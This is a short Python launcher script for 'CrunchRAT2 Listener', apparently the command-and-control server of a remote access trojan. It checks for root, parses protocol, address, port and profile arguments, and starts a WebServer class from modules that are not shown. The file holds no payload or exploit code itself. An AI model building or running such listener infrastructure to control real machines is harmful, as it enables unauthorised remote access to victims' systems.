#!/usr/bin/python3

import argparse
import os
import sys
from core.argchecks import ArgChecks
from core.message import Message
from core.webserver import WebServer


if __name__ == "__main__":
    # if not ran with sudo or root privileges
    # exits the program
    if os.geteuid() != 0:
        Message.display_error("[!] Please re-run with sudo or root privileges.")
        sys.exit()

    parser = argparse.ArgumentParser(prog="listener.py", description="CrunchRAT2 Listener - Written by Hunter Hardman @t3ntman")
    parser.add_argument("protocol", action="store", type=str, help="listener protocol [http][https]")
    parser.add_argument("external_address", action="store", type=str, help="listener external address")
    parser.add_argument("port", action="store", type=int, help="listener port")
    parser.add_argument("profile", action="store", type=str, help="listener profile")

    # parses command-line arguments
    args = parser.parse_args()

    # TO DO: add in command-line argument checks here

    # tries to instantiate WebServer class
    try:
        w = WebServer(args.protocol, args.external_address, args.port, args.profile)

    # exception raised during WebServer class instantiation
    # exits the program
    except Exception as e:
        Message.display_error("[!] Unable to establish database connection.\n" + str(e))
        sys.exit()
